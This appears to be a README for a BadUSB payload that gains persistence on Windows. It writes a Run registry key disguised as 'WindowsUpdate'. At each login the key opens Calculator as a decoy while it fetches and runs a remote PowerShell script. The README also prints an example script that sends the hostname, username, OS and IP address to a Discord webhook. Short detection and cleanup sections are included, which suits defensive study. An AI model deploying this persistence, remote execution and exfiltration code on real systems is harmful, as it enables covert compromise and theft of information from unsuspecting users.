```
▄▄▄▄▄▄    ▄▄▄▄▄       ▄▄▄▄▄▄     ▄▄▄▄▄▄  
▄▀   ░  ▀▄ █     ▀▀▄  ▄▀   ░  ▀▄ ▄▀   ░  ▀▄
█ ░▄▀▀▄ ░░ █ ░█▀▄   ▒ █ ░▄▀▀▄ ░░ █ ░▄▀▀▄ ░░
█ ░▒  █░ ▒ █▒░█  █░ ▓ █ ░▒  █▄▀  █ ░▒  █░ ▒
█░░▓  █░░▓ █▒▒▒▄▀░▒░█ █░░▓▄ ▀    █░░▓  █░░▓
█▒░█  █▒▒█ █▒▒▒░░▒▄▀  █▒░▒▒▀▄    █▒░█  █▒▒█
█▒▓▓  ▓▓▓█ █▒▓█▀▄▒▒█  █▒▓▓▀▀▀    █▒▓▓  ▓▓▓█
█▓▓▒  ▒█▓▓ █▓▓█ █▓▒█  █▓▓▒  ▒▄▄  █▓▓▒  ▒█▓▓
██▓░  ░██▒ ▒███ ▒▓██  ██▓░  ░██▒ ██▓░  ░██▒
█ █▀▄▄▀██░ ░██▓ ░██▓  █ █▀▄▄▀██░ █ █▀▄▄▀██░
▀▄      ▄  ▀▄█▒ ▀▄█▒  ▀▄      ▄  ▀▄      ▄ 
  ▀▀▀▀▀▀     ▀░   ▀░    ▀▀▀▀▀▀     ▀▀▀▀▀▀  
```

# 🔐 Persistence — Registry Run Key

A BadUSB payload that establishes persistence by adding itself to the `HKCU\...Run` registry key.

## ⚠️ Legal Warning

**For authorized penetration testing and red team operations only.** Persistence mechanisms are **malicious** when used without authorization. Unauthorized use is illegal.

## 📋 Description

This payload adds a malicious command to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, which Windows executes automatically on user login.

**What this specific payload does:**
1. Sets a registry Run key called "WindowsUpdate" (masquerades as legitimate)
2. Contains a PowerShell command that:
   - Opens Calculator (cover action)
   - Fetches a payload from your server and executes it
3. Runs silently on every login

## How Windows Run Keys Work

When a user logs in, Windows reads all values under:
- `HKCU\...Run` — runs when **current user** logs in
- `HKLM\...Run` — runs when **any user** logs in (requires admin)

Both execute commands silently in the background.

## Setup

1. Host a malicious `.ps1` payload on your server
2. Replace `https://your-server/payload.ps1` with your URL
3. Run the payload from Ducky or manually

## Example Hosted Payload

```powershell
# payload.ps1 - hosted on your server
$w='YOUR_DISCORD_WEBHOOK_URL'
$info=@{
  hostname=$env:COMPUTERNAME
  user=$env:USERNAME
  os=(Get-CimInstance Win32_OperatingSystem).Caption
  ip=(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content
} | ConvertTo-Json
Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $info
```

## Detection

Defenders should monitor for:
- Registry writes to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- PowerShell execution from registry-spawned processes
- Outbound connections from `explorer.exe` to unknown servers
- Unsigned `.ps1` script execution

## Cleanup

To remove:
```batch
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

## Advanced Variants

This payload is just the simplest form. More advanced:
- **Scheduled tasks** instead of Run key
- **WMI event subscriptions**
- **Services** (requires admin)
- **Startup folder** shortcut

## License

MIT — use at your own risk.
